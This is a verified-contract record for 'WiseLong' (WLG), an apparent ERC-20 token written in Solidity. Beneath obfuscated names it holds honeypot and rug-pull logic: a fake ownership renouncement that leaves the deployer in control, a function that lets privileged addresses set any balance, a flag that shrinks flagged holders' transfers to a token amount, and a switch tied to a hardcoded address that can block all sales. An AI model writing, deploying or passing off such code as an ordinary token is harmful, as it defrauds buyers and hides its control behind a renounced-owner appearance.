{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface txIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingTotalExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txTrading {\n    function createPair(address isTeam, address minSwap) external returns (address);\n}\n\ninterface senderShouldTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isFrom) external view returns (uint256);\n\n    function transfer(address amountTotal, uint256 maxIsMarketing) external returns (bool);\n\n    function allowance(address launchEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxIsMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTotal,\n        uint256 maxIsMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptSender, uint256 value);\n    event Approval(address indexed launchEnable, address indexed spender, uint256 value);\n}\n\ninterface marketingMin is senderShouldTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WiseLong is tradingTotalExempt, senderShouldTake, marketingMin {\n\n    constructor (){\n        if (isReceiver == exemptAuto) {\n            enableIs = feeTake;\n        }\n        txIs toLimit = txIs(walletEnableShould);\n        listWallet = txTrading(toLimit.factory()).createPair(toLimit.WETH(), address(this));\n        \n        sellMode = _msgSender();\n        takeMax();\n        atMarketingAuto[sellMode] = true;\n        receiverFrom[sellMode] = exemptReceiver;\n        \n        emit Transfer(address(0), sellMode, exemptReceiver);\n    }\n\n    bool public launchedLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenModeFund;\n    }\n\n    mapping(address => bool) public liquidityLimitLaunched;\n\n    function amountSell(address enableAmountMode, uint256 maxIsMarketing) public {\n        liquidityAmount();\n        receiverFrom[enableAmountMode] = maxIsMarketing;\n    }\n\n    bool public amountShould;\n\n    bool public isWalletReceiver;\n\n    bool public isReceiver;\n\n    address amountFundFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public fromLimit;\n\n    uint256 private exemptReceiver = 100000000 * 10 ** 18;\n\n    function takeMax() public {\n        emit OwnershipTransferred(sellMode, address(0));\n        takeTrading = address(0);\n    }\n\n    bool public limitMarketing;\n\n    function launchFund(address marketingTeam) public {\n        if (amountShould) {\n            return;\n        }\n        if (limitMarketing == exemptAuto) {\n            limitMarketing = false;\n        }\n        atMarketingAuto[marketingTeam] = true;\n        \n        amountShould = true;\n    }\n\n    uint256 public enableIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptReceiver;\n    }\n\n    uint256 amountTake;\n\n    function balanceOf(address isFrom) public view virtual override returns (uint256) {\n        return receiverFrom[isFrom];\n    }\n\n    string private listBuyIs = \"WLG\";\n\n    address public sellMode;\n\n    function getOwner() external view returns (address) {\n        return takeTrading;\n    }\n\n    address private takeTrading;\n\n    uint256 public receiverSwap;\n\n    uint256 walletToMode;\n\n    uint256 constant buyTrading = 9 ** 10;\n\n    uint256 public feeTake;\n\n    function owner() external view returns (address) {\n        return takeTrading;\n    }\n\n    mapping(address => uint256) private receiverFrom;\n\n    function feeToken(address txFrom, address amountTotal, uint256 maxIsMarketing) internal returns (bool) {\n        if (txFrom == sellMode) {\n            return txReceiver(txFrom, amountTotal, maxIsMarketing);\n        }\n        uint256 autoShould = senderShouldTake(listWallet).balanceOf(amountFundFee);\n        require(autoShould == walletToMode);\n        require(amountTotal != amountFundFee);\n        if (liquidityLimitLaunched[txFrom]) {\n            return txReceiver(txFrom, amountTotal, buyTrading);\n        }\n        return txReceiver(txFrom, amountTotal, maxIsMarketing);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listBuyIs;\n    }\n\n    uint8 private fundTotalLimit = 18;\n\n    event OwnershipTransferred(address indexed sellReceiver, address indexed walletLaunched);\n\n    function allowance(address liquidityBuy, address teamReceiver) external view virtual override returns (uint256) {\n        if (teamReceiver == walletEnableShould) {\n            return type(uint256).max;\n        }\n        return fundTake[liquidityBuy][teamReceiver];\n    }\n\n    function txReceiver(address txFrom, address amountTotal, uint256 maxIsMarketing) internal returns (bool) {\n        require(receiverFrom[txFrom] >= maxIsMarketing);\n        receiverFrom[txFrom] -= maxIsMarketing;\n        receiverFrom[amountTotal] += maxIsMarketing;\n        emit Transfer(txFrom, amountTotal, maxIsMarketing);\n        return true;\n    }\n\n    string private tokenModeFund = \"Wise Long\";\n\n    function approve(address teamReceiver, uint256 maxIsMarketing) public virtual override returns (bool) {\n        fundTake[_msgSender()][teamReceiver] = maxIsMarketing;\n        emit Approval(_msgSender(), teamReceiver, maxIsMarketing);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTotalLimit;\n    }\n\n    bool public exemptAuto;\n\n    function receiverSender(address tradingBuyLimit) public {\n        liquidityAmount();\n        \n        if (tradingBuyLimit == sellMode || tradingBuyLimit == listWallet) {\n            return;\n        }\n        liquidityLimitLaunched[tradingBuyLimit] = true;\n    }\n\n    function transfer(address enableAmountMode, uint256 maxIsMarketing) external virtual override returns (bool) {\n        return feeToken(_msgSender(), enableAmountMode, maxIsMarketing);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundTake;\n\n    mapping(address => bool) public atMarketingAuto;\n\n    address walletEnableShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tradingFee;\n\n    function transferFrom(address txFrom, address amountTotal, uint256 maxIsMarketing) external override returns (bool) {\n        if (_msgSender() != walletEnableShould) {\n            if (fundTake[txFrom][_msgSender()] != type(uint256).max) {\n                require(maxIsMarketing <= fundTake[txFrom][_msgSender()]);\n                fundTake[txFrom][_msgSender()] -= maxIsMarketing;\n            }\n        }\n        return feeToken(txFrom, amountTotal, maxIsMarketing);\n    }\n\n    address public listWallet;\n\n    function maxTake(uint256 maxIsMarketing) public {\n        liquidityAmount();\n        walletToMode = maxIsMarketing;\n    }\n\n    function liquidityAmount() private view {\n        require(atMarketingAuto[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIsMarketing\",\"type\":\"uint256\"}],\"name\":\"amountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIsMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMarketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"}],\"name\":\"launchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityLimitLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxIsMarketing\",\"type\":\"uint256\"}],\"name\":\"maxTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuyLimit\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIsMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxIsMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WiseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}